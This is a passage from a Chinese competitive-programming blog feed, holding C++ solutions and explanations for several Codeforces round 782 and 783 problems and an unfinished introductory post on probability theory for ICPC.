class="comment">//m&gt;n</span></span><br><span class="line">        <span class="built_in">swap</span>(n,m);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>&amp;&amp;m&gt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    ans+=<span class="number">2</span>*n<span class="number">-2</span>;</span><br><span class="line">    m-=n;</span><br><span class="line">    <span class="keyword">if</span>(m==<span class="number">0</span>)&#123;</span><br><span class="line">        ans+=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            ans+=<span class="number">2</span>*m;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans+=<span class="number">2</span>*m<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Social-Distance"><a href="#B-Social-Distance" class="headerlink" title="B.Social Distance"></a>B.Social Distance</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/20/codeforces%20round%20783(div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>n个人要做在m把椅子上，每个人对自己有要求，要求左右两边必须有一定数目把空椅子。这个交错两发，后面发现这些人不是按顺序坐的，可以随意排，那么不难发现我们可以对要求从小到大排序然后相邻之间的要求取max最后取和得到一个值与m比较即可。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000006</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">1</span>]+<span class="number">1</span>&gt;m)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    </span><br><span class="line">    a[<span class="number">0</span>]=a[n];</span><br><span class="line">    <span class="keyword">int</span> ans=n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">max</span>(a[i],a[i<span class="number">-1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans&lt;=m)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Make-it-Increasing"><a href="#C-Make-it-Increasing" class="headerlink" title="C. Make it Increasing"></a>C. Make it Increasing</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/20/codeforces%20round%20783(div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定一个初始值全为0的数组，每个位置可以固定加或减一定的值，要求序列严格递增，求最少操作次数。对于这个问题只需要抓住一个重点：那就是谁为0，根据给定的 $n&lt;5000$ 基本可以判断出来这个要 $O(n^2)$ 的算法。我们只需要循环把一个数强制设置为0，然后0往左边递减，往右边递增，这里我也可以往左边递增，因为减去和加上差不多的嘛，我加上让它递增和减去让它递减是差不多的。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">5005</span>];</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">5005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0x7fffffffffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;<span class="comment">//zero</span></span><br><span class="line">        <span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(b));</span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">            <span class="keyword">int</span> k=<span class="built_in">ceil</span>((<span class="keyword">double</span>)(b[j+<span class="number">1</span>]+<span class="number">1</span>)/a[j]);</span><br><span class="line">            ans+=k;</span><br><span class="line">            b[j]=k*a[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> k=<span class="built_in">ceil</span>((<span class="keyword">double</span>)(b[j<span class="number">-1</span>]+<span class="number">1</span>)/a[j]);</span><br><span class="line">            ans+=k;</span><br><span class="line">            b[j]=k*a[j];</span><br><span class="line">        &#125;</span><br><span class="line">        res=<span class="built_in">min</span>(res,ans);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时也有点没注意到就是数值可能很大，大到超过int，当时初值我只给了0x7fffffff就wa了一发。</p><p>这场比赛失误了很多吧，不过最后还得感谢大自然的馈赠，写了一个明显有问题的程序让我hack了，没至于让我掉太多分。</p><p><img src="/2022/04/20/codeforces%20round%20783(div.2)/4.png" alt="4"></p><p>继续加油吧，上分之路还很漫长。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 思维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>概率论在icpc的应用</title>
      <link href="/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>昆明打铁之后，痛定思痛，来重修概率论了。</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="样本空间、事件和概率"><a href="#样本空间、事件和概率" class="headerlink" title="样本空间、事件和概率"></a>样本空间、事件和概率</h2><p><strong>样本空间</strong> S 是一个集合，它的元素称为<strong>基本事件</strong>。样本空间的一个子集被称为事件， 根据定义，所有基本事件<strong>互斥</strong>。</p><p><strong>互斥事件</strong>：若事件 A 发生<strong>一定</strong>能推导出 B 不发生，B 发生<strong>一定</strong>能推导出A不发生，则称 A，B 互斥，不难得出，两个事件同时发生的概率为 0，至少发生其中一个事件的概率为两者概率之和（概率公理3）。这个理论可以推导到 n 个事件，若有 n 个<strong>两两互斥</strong>事件 $a_1,a_2…a_n$，则任意两个事件同时发生的概率为 0，任意发生一个事件的概率就为 $\sum _{i=1}^n a_i$ 。</p><p><strong>概率公理</strong>：</p><ol><li>对于任意事件 A，事件发生的概率满足 $0\le P{A}\le1$</li><li>对于样本空间 S，有$P{S}=1$</li><li>对于两个互斥事件 A，B，有 $P{A∪B}=P{A}+P{B}$</li></ol><h2 id="随机变量"><a href="#随机变量" class="headerlink" title="随机变量"></a>随机变量</h2><p>如果对样本空间 S 中的任意事件 e，都有<strong>唯一</strong>的实数 <strong>X(e)</strong> 与之对应，则称 <strong>X=X(e)</strong> 为样 本空间 S 上的随机变量。这个随机变量怎么理解呢，首先看下面这张图：</p><p><img src="/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/1.png" alt="1"></p><p>还不能理解的话，就举个栗子，如果掷一个骰子，那么它的样本空间为 **{1,2,3,4,5,6}**，把它一次掷骰子出的点数作为一个随机变量的话，那么很    容易得到映射 X 就是一个普通的 $X(e)=e$，或者说，随机变量为样本点 e 的函数，以样本点为自变量，确定一个对应关系得到的应变量就是一个随机变量。</p><p>其中<strong>离散型随机变量</strong>和<strong>连续型随机变量</strong>比较常见。</p><h3 id="离散型随机变量及其概率分布"><a href="#离散型随机变量及其概率分布" class="headerlink" title="离散型随机变量及其概率分布"></a>离散型随机变量及其概率分布</h3><p>离散型随机变量取值范围为<strong>有限可数</strong>或者<strong>无限可数</strong>，或者说取值范围不在实数范围内连续。设离散型随机变量 X 的取值为 $\text{x}_i$ 时的概率为 $p_i(i=1,2…)$，则称 X 的所有取值及其概率为随机变量 X 的概率分布。离散型变量常见的分布有两点分布，二项分布，几何分布，超几何分布，泊松分布。</p><h3 id="连续性随机变量及其概率分布"><a href="#连续性随机变量及其概率分布" class="headerlink" title="连续性随机变量及其概率分布"></a>连续性随机变量及其概率分布</h3><p>如果 X 是在实数域或区间上<strong>取连续值</strong>的随机变量，设 X 的概率分布函数为 $F(x)=P{X\le x}$，若存在非负可积函数 $f(x)$，使得对任意的 x，有 $F(x)=\int _{-∞}^{x}f(t)dt$，则称 X 为连续随机变量，称 $f(x)$ 为 X 的<strong>概率密度函数</strong>。常见的连续性随机变量分布有均匀分布，正态分布，指数分布。</p><p>概率密度函数的几何意义：随机变量的取值落在某个区域之内的概率为概率密度函数在这个区域上的积分。当概率密度函数存在的时候，累积分布函数是概率密度函数的积分，对概率密度函数作傅里叶变换可得特征函数。</p><p>在数学中，连续型随机变量的概率密度函数（在不至于混淆时可以简称为密度函数）是一个描述这个随机变量的输出值，在某个确定的取值点附近的可能性的函数。而随机变量的取值落在某个区域之内的概率则为概率密度函数在这个区域上的积分。当概率密度函数存在的时候，累积分布函数是概率密度函数的积分。</p><h4 id="连续型随机向量及其概率分布"><a href="#连续型随机向量及其概率分布" class="headerlink" title="连续型随机向量及其概率分布"></a>连续型随机向量及其概率分布</h4><p>待更新</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 数学 </category>
          
          <category> 概率论 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>codeforces round 782(div2)解析</title>
      <link href="/2022/04/18/codeforces%20round%20782(div2)/"/>
      <url>/2022/04/18/codeforces%20round%20782(div2)/</url>
      
        <content type="html"><![CDATA[<p>还是很开心的，第一次CF打出来D题，嘎嘎上132分，目前1584分，紫名指日可待。</p><span id="more"></span><h2 id="A-Red-Versus-Blue"><a href="#A-Red-Versus-Blue" class="headerlink" title="A.Red Versus Blue"></a>A.Red Versus Blue</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/04/18/codeforces%20round%20782(div2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>知道双方赢球场次，要求构造一个输赢序列使得总比赛中最大连赢场数最小，即给定两种字符及个数，输出一个字符串使得由相同字符构成的子串最短。</p><p>首先题目给定了B的数目严格小于R，那么最优的情况一定是一输一赢，考虑在 b 个 B 中插入R，容易得到总共有 b+1 个可以插入的位置。若 r 可以整除 b+1，则可以得出答案为 r/(b+1)，若否，则得到 r/(b+1)+1。</p><p>我们先在b+1个位置中每个放上 r/(b+1) 个 R，剩下r%(b+1)个R则随便给，只要不要一个位置给两次就可以了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,r,b;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;r&gt;&gt;b;</span><br><span class="line">    <span class="keyword">int</span> k=r/(b+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> res=r%(b+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=b;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=k;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(res)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">            res--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=k;j++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(res)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">        res--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Bit-Flipping"><a href="#B-Bit-Flipping" class="headerlink" title="B. Bit Flipping"></a>B. Bit Flipping</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/04/18/codeforces%20round%20782(div2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定二进制字符串和k次的操作，要求输出最大字典序的字符串。一次操作会使任意一个位置的字符不变，其它的全部取反。那么容易得到一个结论：对任意一个位置操作偶数次不会该边整体字符串。</p><p>如果k为偶数，则未操作过的数（或者说操作次数为偶数）的数将不变，操作过的数（或者说操作次数为奇数）的数将取反。</p><p>如果k为奇数，则与偶数情况刚好相反。</p><p>我们考虑偶数情况，字符串高位开始，若碰到0则取反变成1，减少一次操作次数并记录在这个位置。若操作到所有序列为全1，则将剩余的操作全部甩给最后一位，使得最后的结果只存在 $111…1$ 和 $111…0$。如果为奇数的话，把0当成1，1当成0即可，我们最后输出的时候把0输出为1，1输出为0，操作按偶数方法操作并且尽量使得字符串结果为0。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1000005</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> p=k%<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;1&#x27;</span>&amp;&amp;k)&#123;</span><br><span class="line">                s[i]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                a[i]=<span class="number">1</span>;</span><br><span class="line">                k--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                a[i]=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;0&#x27;</span>&amp;&amp;k)&#123;</span><br><span class="line">                s[i]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">                a[i]=<span class="number">1</span>;</span><br><span class="line">                k--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                a[i]=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a[n<span class="number">-1</span>]+=k;</span><br><span class="line">    <span class="keyword">if</span>(k%<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p)&#123;</span><br><span class="line">            s[n<span class="number">-1</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            s[n<span class="number">-1</span>]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p^(s[i]==<span class="string">&#x27;1&#x27;</span>))<span class="built_in">putchar</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">putchar</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;<span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/18/codeforces%20round%20782(div2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定占领的国家的位置和占领花费系数以及迁都花费系数，求最少花费占领所有王国。</p><p>我们可以算迁都产生的花费和产生的收益进行比较，当收益&gt;=花费时我们选择迁都，否则选择直接攻打那些国家。</p><p>不难得到迁都产生的花费为 $b|x_i-pos|$，pos为当前首都的位置，得到的收益为：$a|x_i-pos|*(n-i)$，判断一下模拟就直接过。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 